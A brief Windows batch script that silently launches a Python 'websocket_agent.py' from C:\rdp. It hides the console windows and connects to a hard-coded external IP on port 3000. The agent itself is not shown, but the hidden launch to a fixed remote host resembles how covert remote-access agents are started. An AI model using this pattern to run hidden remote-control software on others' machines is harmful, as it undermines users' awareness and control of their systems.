@echo off
REM WebSocket Agent Startup Script
cd /d "C:\rdp\"
powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '3.237.240.137', '3000', 'test' -WindowStyle Hidden"
